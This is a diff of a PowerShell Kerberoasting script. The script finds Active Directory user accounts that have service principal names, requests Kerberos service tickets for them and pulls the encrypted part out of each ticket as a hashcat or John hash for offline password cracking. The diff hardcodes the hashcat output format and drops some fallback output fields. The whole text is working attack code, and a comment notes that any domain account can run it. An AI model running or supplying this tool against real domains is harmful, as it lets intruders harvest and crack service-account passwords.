@@ -2,21 +2,18 @@ Add-Type -Assemblyname System.IdentityModel
 $ErrorActionPreference = 'silentlycontinue'
 
 #variabler
-
-$TargetList = @()
 $TargetAccount = "TESTHEST"
-
 $Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
 $Path = 'GC://DC=' + ($Forest.RootDomain -Replace ("\.",',DC='))
 $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$Path)
 $Searcher.PropertiesToLoad.Add("userprincipalname") | Out-Null
+
 <#
 The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. 
 Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline.
 You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
 Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
 #>
-
 
 $ad_search = New-Object DirectoryServices.DirectorySearcher
 $ad_search.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))" #Vil ikke have computernavne men kun service principal names
@@ -34,9 +31,7 @@ foreach($user in $user_objects) {
                     $bytestream = $ticket.GetRequest()
                     
                     $hexstream = [System.BitConverter]::ToString($bytestream) -Replace "-"
-                    #$hexstream
-                    if ($bytestream) {
-                        $Out = New-Object PSObject        
+                    if ($bytestream) {      
                         # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
                         # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
                         if($hexstream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
@@ -48,18 +43,15 @@ foreach($user in $user_objects) {
                             if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                                 Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                                 $hash = $null
-                                $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($bytestream).Replace('-',''))
                             } else {
                                 $hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
-                                $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                             }
                         } else {
                             Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                             $hash = $null
-                            $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($bytestream).Replace('-',''))
                         }
                     }
-                    $outputformat = Read-Host "Choose between 'HASHCAT' or 'JOHN format: "
+                    $outputformat = 'hashcat'
 
                     if($hash) {
                         if ($outputformat -match 'JOHN') {
